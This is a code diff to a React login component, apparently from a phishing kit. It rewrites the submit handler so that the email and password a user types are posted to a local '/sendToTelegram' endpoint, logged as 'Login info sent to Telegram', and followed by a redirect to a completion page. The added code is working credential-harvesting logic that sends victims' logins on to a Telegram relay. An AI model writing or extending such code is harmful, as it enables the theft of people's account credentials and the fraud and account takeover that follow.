@@ -10,10 +10,38 @@ const Login = () => {
   const [password, setPassword] = useState("");
   const navigate = useNavigate();
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
-    navigate("/complete");
+ const handleSubmit = async (e) => {
+  e.preventDefault();
+
+  // Prepare data to send (add dummy fields for your backend if necessary)
+  const data = {
+    email,
+    password,
   };
+
+  try {
+    const response = await fetch('http://localhost:4000/sendToTelegram', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    });
+
+    if (response.ok) {
+      console.log('Login info sent to Telegram');
+      // Now navigate after successful send
+      navigate("/complete");
+    } else {
+      console.error('Failed to send login info');
+      // Optionally show error feedback here
+    }
+  } catch (error) {
+    console.error('Error sending login info:', error);
+  }
+};
+
+  
 
   return (
     <div className="flex flex-col min-h-screen bg-[#ffffff]">
